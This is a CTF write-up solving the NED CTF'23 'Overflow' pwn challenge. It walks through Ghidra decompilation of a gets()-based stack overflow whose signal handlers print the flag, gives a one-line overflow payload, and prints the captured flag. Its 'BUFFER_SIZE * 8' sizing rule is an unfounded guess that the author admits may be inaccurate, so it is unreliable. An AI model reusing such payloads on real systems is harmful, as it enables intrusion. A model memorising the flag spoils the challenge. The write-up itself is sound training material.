---
title: NED CTF'23 - Pwn - Overflow
date: '2023-07-03'
tags: ['ctf', 'pwn', 'nedctf', 'writeup', 'buffer-overflow', 'x64']
draft: false
summary: A classic x64 stack overflow.
---

## Challenge Description

Can you overflow the buffer and get the flag?

Author: [Saad Akhtar](https://twitter.com/ssaadakhtarr)

```bash
nc 159.223.192.150 9001
```

![chal-info](/static/writeups/nedctf/pwn/overflow0.png)


## Solution

Downloading the `overflow.zip`, we get the following files

![files](/static/writeups/nedctf/pwn/overflow1.png)

`overflow` is the binary, `flag.txt` is a testing flag file to do local testing. However, `.gdb_history` seem pretty interesting. Let's see what's inside

![gdb-history](/static/writeups/nedctf/pwn/overflow2.png)

Well, that was a dead-end, let's check the file type and the checks on the binary

![file](/static/writeups/nedctf/pwn/overflow3.png)

Well, let's open this in Ghidra and see what's going on

![functions](/static/writeups/nedctf/pwn/overflow4.png)

We can see 3 functions that see pretty interesting, `overflow_handler`, `segv_handler` and `win`. Before checking them out, let's checkout the `main` function.

```c
undefined8 main(void) {
  sigaction local_168;
  sigaction local_c8;
  char local_28 [32];
  
  setvbuf(stdout,(char *)0x0,2,0);
  setvbuf(stdin,(char *)0x0,2,0);
  fflush(stdout);
  local_c8.__sigaction_handler = segv_handler;
  local_c8.sa_flags = -0x80000000;
  sigaction(0xb,&local_c8,(sigaction *)0x0);
  local_168.__sigaction_handler = overflow_handler;
  local_168.sa_flags = 0x10000000;
  sigaction(6,&local_168,(sigaction *)0x0);
  banner();
  printf("\n\nEnter your name: ");
  gets(local_28);
  printf("Hello, %s\n",local_28);
  return 0;
}
```

Okay, straight off the bat, we can see `gets` function being used. This is a classic buffer overflow vulnerability. Along with that, it's making use of `sigaction` to handle the `SIGSEGV` and `SIGABRT` signals. According to the man page

> The sigaction() system call is used to change the action taken by a process on receipt of a specific signal.  (See signal(7) for an overview of signals.)

Okay, in simpler terms, the first sigaction i.e. `local_c8` is handling SEGV, i.e. segmentation fault, that in case the process tries to access a memory location that it doesn't have access to, it will be handled by the `segv_handler` function. The second one, is being handled by `overflow_handler`, and will be called in case a buffer overflow occurs. Let's take a look at the `segv_handler` function.

```c
void segv_handler(void) {
  puts("Segmentation fault detected");
  win();
                    /* WARNING: Subroutine does not return */
  exit(1);
}
```

Pretty straight forward function, simply calls the `win` function. Let's take a look at `overflow_handler` function.

```c
void overflow_handler(void) {
  puts("Buffer overflow detected!");
  win();
                    /* WARNING: Subroutine does not return */
  exit(0);
}
```

Similar to the `segv_handler` function, it simply calls the `win` function. Let's take a look at the `win` function.

```c
void win(void) {
  int iVar1;
  FILE *__stream;
  
  __stream = fopen("flag.txt","r");
  if (__stream == (FILE *)0x0) {
    puts("Error: could not open file.");
  }
  else {
    printf("\nHere\'s your flag: ");
    while( true ) {
      iVar1 = fgetc(__stream);
      if ((char)iVar1 == -1) break;
      putchar((int)(char)iVar1);
    }
    fclose(__stream);
  }
  return;
}
```

Here, the `win` function is simply opening the `flag.txt` file and printing it's contents. So, we need to overflow the buffer and call the `win` function.

Now, to solve this, we can simply overflow the buffer, and let the signal handlers give us the flag. The buffer size specified is `32`, however, to overflow, I calculate using the following technique:

```md
BUFFER_SIZE * 4 - in case of 32-bit binaries
BUFFER_SIZE * 8 - in case of 64-bit binaries
```

However, I don't know how accurate this is, but it works for me. Now, let's try out the first method, i.e. overflowing the buffer and letting the signals give us the flag.

```bash
$ python -c "print('A' * 40)" | ./overflow
```

![overflow](/static/writeups/nedctf/pwn/overflow5.png)

Now, it was that easy. Simply piping the output into the `nc` command, we get the flag

![flag](/static/writeups/nedctf/pwn/overflow6.png)

```md
Flag: NCC{y0ur_v3ry_f1rst_s3g_f4ult}
```
